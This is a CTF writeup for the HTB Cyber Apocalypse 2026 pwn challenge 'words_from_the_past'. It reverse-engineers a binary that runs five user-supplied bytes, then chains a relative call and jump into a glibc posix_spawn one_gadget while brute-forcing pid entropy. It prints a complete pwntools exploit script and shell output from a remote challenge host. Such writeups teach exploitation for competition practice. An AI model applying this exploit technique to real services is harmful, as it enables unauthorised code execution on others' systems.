@@ -1,0 +1,369 @@
+---
+title: HTB Cyber Apocalypse CTF 2026 - words_from_the_past
+description: "A pwn writeup from HTB Cyber Apocalypse CTF 2026 — chaining single 5-byte relative branches through a two-state RWX-page machine to land a posix_spawn one_gadget with no libc leak."
+date: "2026-07-29"
+category: "CTF Writeup"
+tags:
+  - pwn
+  - binary-exploitation
+---
+
+## Let's get Cracking...
+
+This blog has a pwn challenge writeup that I solved at HTB Cyber Apocalypse CTF 2026.
+
+**Category:** Pwn (binary exploitation — shellcoding / anti-analysis)
+
+> The deployed `flag.txt` literally contains a **space** (`0x20`) between `t0` and
+> `rul3` — the wordplay is *"five bytes of precision **to rule** them all"*. Submit it
+> verbatim, space included; do **not** convert the space to an underscore.
+
+---
+
+## 1. The challenge
+
+We are given a Docker bundle: a stripped 64-bit ELF `words_from_the_past`, a private copy
+of glibc (`glibc/libc.so.6`, `glibc/ld-linux-x86-64.so.2`), and a `Dockerfile` that serves
+the binary over `socat`:
+
+```dockerfile
+FROM alpine:latest
+RUN apk add --no-cache socat dash && ln -sf /usr/bin/dash /bin/sh
+...
+CMD ["socat", "tcp-l:1337,reuseaddr,fork", "EXEC:./words_from_the_past"]
+```
+
+### Protections
+
+```
+$ pwn checksec words_from_the_past
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'$ORIGIN/glibc'          # ships its own glibc 2.39 (Ubuntu 2.39-0ubuntu8.7)
+```
+
+Everything is on. But NX turns out not to matter, because the program **hands us an
+executable page and jumps into it.**
+
+### What the binary actually does
+
+The binary is stripped, so all names below are the addresses of the corresponding
+functions (relative to the PIE base). `main` lives at `0x16d5`. Its important behaviour:
+
+1. **Print a braille-art banner** plus the line
+   `[Garran Voss] Rin.. You know what to do... Precise moves, keep it fast and lethal..`
+2. **Fork once.** A one-shot guard (`[0x502c]`) makes the fork happen only on the very
+   first entry; the parent `waitpid`s + `_exit`s, the child continues. This isolates each
+   attempt so a crash doesn't take down the listener.
+3. **`prctl(PR_SET_DUMPABLE, 0)`** — makes `/proc/<pid>/maps` root-only (anti-dump).
+4. **Set up an RWX page and read 5 bytes into it** (details in §1.1).
+5. **Run a battery of anti-analysis checks** on those 5 bytes and on the environment
+   (§1.2). Any failure prints a themed message and `exit(1)`.
+6. **Jump into the page:**
+
+```asm
+1898: mov    rdx, [rbp-0x18]      ; rdx = mmap'd RWX page
+189c: mov    qword [rbp-0x78], 0
+18a4: xor    ebx, ebx             ; rbx = 0
+18a6: xor    ecx, ecx             ; rcx = 0
+18a8: mov    r12d, 0xdead         ; r12 = 0xdead
+18ae: mov    eax, 1               ; rax = 1
+18b3: and    rsp, -0x10           ; 16-byte align
+18b7: jmp    rdx                  ; ---> execute our 5 bytes
+```
+
+Five bytes is exactly the size of **one** `call rel32` (`E8 xx xx xx xx`) or `jmp rel32`
+(`E9 xx xx xx xx`) instruction. So each "stage" of the exploit is a single relative
+branch, and the fixed register state above (`rax=1, rbx=0, rcx=0, r12=0xdead`) is what any
+final gadget has to cope with.
+
+### 1.1 The two-state mmap machine
+
+A second global (`[0x5030]`) is a small state machine that changes **where** the page is
+mapped and **which opcode** the 5 bytes must begin with:
+
+```asm
+; state 0  (first entry)
+1772: lea  rax, [rip-0xa4]        ; rax = main (0x16d5)
+1779: add  rax, 0x10000           ; hint = main + 0x10000
+177f: mov  [rbp-0x30], rax        ; mmap addr hint
+1783: mov  dword [0x5030], 1
+178d: mov  byte [rbp-0x3d], 0xe8  ; required first byte = 0xE8  (CALL)
+
+; state != 0  (every later entry)
+1793: call 0x159e                 ; leak libc base from /proc/self/maps  -> rax
+179c: call getpid
+17a3: and  eax, 7                 ; k = getpid() & 7      (3 bits of entropy)
+17a6: add  rax, 0x1000
+17ac: shl  rax, 0xc               ; offset = (0x1000 + k) << 12 = 0x1000000 + k*0x1000
+17b0: ...                         ; addr = libc_base - offset
+17c0: or   dword [rbp-0x3c], 0x10 ; flags |= MAP_FIXED
+17ce: mov  byte [rbp-0x3d], 0xe9  ; required first byte = 0xE9  (JMP)
+
+17f4: call mmap                   ; mmap(addr, 0x1000, PROT_RWX, flags, -1, 0)
+182e: call read                   ; read(0, page, 5)
+```
+
+Function `0x159e` opens `/proc/self/maps`, finds the line containing both `"libc.so.6"`
+and `"r--p"` (the first, read-only libc segment = the libc base) and `strtoul`s the start
+address. So the binary itself hands the second-stage page a **known, page-exact offset
+below libc**: `page2 = libc_base - 0x1000000 - k*0x1000`.
+
+Summary:
+
+| entry | page location | first byte must be |
+|-------|---------------|--------------------|
+| 1st (state 0) | `main + 0x10000`  → lands at `base + 0x11000` | `0xE8` (`call rel32`) |
+| 2nd+ (state ≠0) | `libc_base − 0x1000000 − (getpid()&7)·0x1000` (MAP_FIXED, RWX) | `0xE9` (`jmp rel32`) |
+
+### 1.2 The anti-analysis checks (all bypassable by just being nice)
+
+* **`0x1295`** — bails with *"Preload detected!"* if `LD_PRELOAD`/`LD_AUDIT` is set,
+  *"Debugger detected!"* if `/proc/self/status` shows a non-zero `TracerPid`, and
+  *"Timing anomaly detected!"* on an `rdtsc` delta check. → Don't use `LD_PRELOAD`, don't
+  `ptrace`/`strace`/`gdb` the live process.
+* **`0x14b1`** — *"Encoding violation detected!"* if any of the 5 bytes is `0x00` or `0x0a`.
+* **`0x1515`** — *"Breakpoint detected!"* if any byte is `0xCC` (int3).
+* **`0x1565`** — *"Invalid instruction!"* if `page[0] != marker` (`0xE8` or `0xE9`).
+
+None of these constrain the exploit beyond: **no NUL / newline / 0xCC bytes, and the first
+byte is fixed by the state.**
+
+---
+
+## 2. Key observations
+
+### 2.1 We only ever get one relative branch per stage — so we must chain stages
+
+Five bytes = one `call`/`jmp rel32`. A single branch can't drop a shell by itself, so the
+plan is to use **stage 1's `call`** to re-drive the program into **state 2**, which hands
+us a second page sitting at a known offset from libc, and then use **stage 2's `jmp`** to
+land inside libc.
+
+### 2.2 Stage 1's page is at a *constant* offset from the binary
+
+`page1 = base + 0x11000` (the hint `main+0x10000 = base+0x116d5`, rounded down to a page by
+the kernel — verified empirically, §3.1). Because both `page1` and `main` move together
+with the PIE base, the relative distance is **ASLR-independent**:
+
+```
+rel_to_main = main − (page1 + 5) = 0x16d5 − 0x11005 = −0xF930
+stage1 = E8 D0 06 FF FF            # call main
+```
+
+Re-entering `main` flips the state machine (`[0x5030]` is now `1`), skips the fork (guard
+already set), reprints the banner, and this time maps the **state-2** page next to libc and
+reads our second 5 bytes.
+
+### 2.3 Stage 2's page is at a *known* offset from libc, modulo 3 bits
+
+`page2 = libc_base − 0x1000000 − k·0x1000`. Everything is fixed except `k = getpid()&7`.
+A `jmp rel32` (±2 GB) easily reaches anywhere in libc from there:
+
+```
+rel_to_target = (libc_base + off) − (page2 + 5)
+              = off + 0x1000000 + k·0x1000 − 5     # libc_base cancels — no leak needed!
+```
+
+The **only** unknown at exploit time is the 3-bit `k`. We brute-force it (8 values); each
+connection forks a fresh child with a fresh pid, so we just retry until our guess matches.
+
+### 2.4 The final gadget has to survive `rax=1, rbx=0, rcx=0, r12=0xdead`
+
+We can't change those registers — they're written immediately before `jmp rdx`. That rules
+out most one_gadgets (the `execve` ones need `rax==NULL` or `r12==NULL`; `r12=0xdead` and
+`rax=1` kill them). The one that fits is a **`posix_spawn`** gadget that only requires
+`rbx==0` and `rcx==0` — which we already have (§3.3).
+
+---
+
+## 3. The attack in detail
+
+### 3.1 Pinning down stage 1's page (`base + 0x11000`)
+
+The mmap uses a *hint*, not `MAP_FIXED`, so the exact page depends on how the kernel rounds
+`base + 0x116d5`. Rather than guess, I probed the live service: send `stage1` computed for
+a candidate page `P`, and watch whether the **banner is printed a second time** (which only
+happens if the `call` actually reached `main`).
+
+```
+$ python3 diag.py        # against 154.57.164.69:31131
+0x11000  banners_after_stage1 = 2     <-- call reached main
+0x12000  banners_after_stage1 = 1
+0x10000  banners_after_stage1 = 1
+0x13000  banners_after_stage1 = 1
+```
+
+`P = 0x11000` it is. This is a non-destructive probe (no crash needed), and it matched both
+the local Docker and the remote kernel.
+
+### 3.2 Confirming stage 2 actually executes our bytes
+
+To be sure the second page runs *our* 5 bytes (and isn't, say, silently failing the mmap),
+I sent an **infinite-loop** stage 2, `jmp $` = `E9 FB FF FF FF` (rel = −5, jumps to itself),
+and a deliberately-wild jump, and measured hang-vs-close:
+
+```
+jmp-self             -> HANG (connection stays open = looping in our page)
+jmp +0x41414141      -> CLOSED immediately (child crashed on the bad target)
+```
+
+So stage 2 genuinely transfers control into libc-adjacent RWX and executes what we write.
+
+### 3.3 Choosing the one_gadget
+
+```
+$ one_gadget glibc/libc.so.6
+...
+0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
+constraints:
+  address rsp+0x68 is writable
+  rsp & 0xf == 0
+  rcx == NULL || {rcx, rax, ...} is a valid argv
+  rbx == NULL || (u16)[rbx] == NULL
+...
+0xef4ce execve("/bin/sh", rbp-0x50, r12)      # needs r12==NULL   -> r12=0xdead  ✗
+0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])# needs rax==NULL   -> rax=1       ✗
+```
+
+At `jmp rdx` we have `rbx=0`, `rcx=0`, and `rsp` freshly 16-aligned (`and rsp,-0x10`), with
+plenty of writable stack. That satisfies **`0x583f3`** exactly:
+
+```
+stage2(k) = 0xE9 || p32( 0x583f3 + 0x1000000 + k*0x1000 − 5 )
+          = 0xE9 || p32( 0x10583EE + k*0x1000 )
+```
+
+For every `k∈0..7` the four rel bytes avoid `0x00/0x0a/0xcc` (low byte is always `0xEE`,
+next is `0x83..0xF3`, then `0x05`, `0x01`), so the encoding check always passes.
+
+### 3.4 Brute-forcing `k`
+
+`k = getpid()&7` is fixed within a connection but random across connections. We reconnect,
+run stage 1 → stage 2 with a guessed `k`, and test for a shell by sending a marker command:
+
+```python
+r.send(stage1())                 # E8 D0 06 FF FF   (call main)
+r.recvuntil(b'lethal..')         # 2nd banner: main re-entered, page2 ready, reading 5 bytes
+r.send(stage2(k))                # E9 .. .. .. ..   (jmp one_gadget)
+r.sendline(b'echo S_H_3_L_L; id; cat flag.txt ...')
+```
+
+Wrong `k` → the child jumps to a bad libc offset and dies (connection closes); right `k` →
+`posix_spawn("/bin/sh")` and we get a shell. Expected ≈ 8 tries.
+
+---
+
+## 4. Putting it together
+
+Full client is `exploit.py`. Per connection it:
+
+1. reads the first banner (`recvuntil("lethal..")`),
+2. sends **stage 1** = `call main` (`E8 D0 06 FF FF`),
+3. reads the second banner (proves state-2 page is set up and awaiting 5 bytes),
+4. sends **stage 2** = `jmp libc+0x583f3` for the current `k` guess,
+5. sends a shell command and checks for the marker / flag,
+6. reconnects with the next `k` on failure.
+
+### Local end-to-end verification
+
+The binary ships its own glibc via `RUNPATH=$ORIGIN/glibc`, so it runs unmodified inside
+the provided Alpine image. I built it and dropped in a fake flag:
+
+```
+$ docker build --platform linux/amd64 -t wfp .
+$ docker run -d --name wfp -p 31337:1337 wfp
+$ docker exec -u root wfp sh -c 'echo HTB{local_test_flag} > /home/ctf/flag.txt'
+$ python3 exploit.py 127.0.0.1 31337
+[+] shell (try 0, k=0)
+S_H_3_L_L
+uid=100(ctf) gid=101(ctf) groups=101(ctf)
+HTB{local_test_flag}
+```
+
+> **Debugging note.** Docker Desktop on Apple Silicon runs the x86-64 container under
+> Rosetta, which relocates anonymous mmaps in the *host* address space, so
+> `/proc/<pid>/maps` read from outside is misleading. The **guest** view (what the binary's
+> own `/proc/self/maps` parser and the relative branches see) is self-consistent, which is
+> all the exploit relies on — so the offsets transfer to the real x86-64 remote unchanged.
+> To find the one_gadget I confirmed the winning gadget deterministically by reading the
+> child pid to compute the exact `k` for each local run.
+
+### Against the real target
+
+```
+$ python3 exploit.py 154.57.164.69 31131
+try 0 k=0 ...
+try 1 k=1 ...
+[+] shell (try 2, k=2)
+S_H_3_L_L
+uid=100(ctf) gid=101(ctf) groups=101(ctf)
+HTB{f1v3_byt3s_0f_pr3c1s10n_t0 rul3_th3m_4ll_8516a70464eee52079d2a27ee0536043}
+```
+
+Shell on the third connection (`k=2`).
+
+### Reading the flag byte-exactly
+
+Because the flag contains a space, I confirmed it over the raw socket (no reliance on target
+tools) rather than trusting a terminal render:
+
+```
+LEN 78
+HEX 4854427b...5f7430 20 72756c33 5f...36303433 7d
+                    ^^ 0x20 == space, between "t0" and "rul3"
+FLAG b'HTB{f1v3_byt3s_0f_pr3c1s10n_t0 rul3_th3m_4ll_8516a70464eee52079d2a27ee0536043}'
+```
+
+---
+
+## 5. Flag
+
+```
+HTB{f1v3_byt3s_0f_pr3c1s10n_t0 rul3_th3m_4ll_8516a70464eee52079d2a27ee0536043}
+```
+
+---
+
+### `exploit.py` (core)
+
+```python
+from pwn import *
+import struct, time, sys
+
+HOST, PORT = sys.argv[1], int(sys.argv[2])
+MAIN, STAGE1_PAGE = 0x16d5, 0x11000
+OG, LIBC_GAP      = 0x583f3, 0x1000000       # posix_spawn one_gadget ; (0x1000<<12)
+
+def stage1():
+    rel = (MAIN - (STAGE1_PAGE + 5)) & 0xffffffff
+    return b'\xe8' + struct.pack('<I', rel)                  # call main
+
+def stage2(k):
+    rel = (OG + LIBC_GAP + k*0x1000 - 5) & 0xffffffff
+    return b'\xe9' + struct.pack('<I', rel)                  # jmp libc+0x583f3
+
+def attempt(k):
+    r = remote(HOST, PORT, timeout=5)
+    r.recvuntil(b'lethal..'); r.send(stage1())               # re-enter main -> state 2
+    r.recvuntil(b'lethal..'); r.send(stage2(k))              # jump into libc
+    time.sleep(0.4)
+    r.sendline(b'echo S_H_3_L_L; id; cat flag.txt 2>/dev/null')
+    time.sleep(0.6)
+    d = r.recvrepeat(1.5); r.close(); return d
+
+for i in range(200):                                         # brute k = getpid()&7
+    try: d = attempt(i % 8)
+    except Exception: d = b''
+    if d and (b'S_H_3_L_L' in d or b'HTB{' in d):
+        print(d.decode('latin1')); break
+```
+
+I hope that you liked this blog and I'll see you in the next one. Stay in the loop with my latest content – follow me on [Medium](https://medium.com/@iabdullah_215) for more!
+
+## THANKS
+
+## MUHAMMAD ABDULLAH
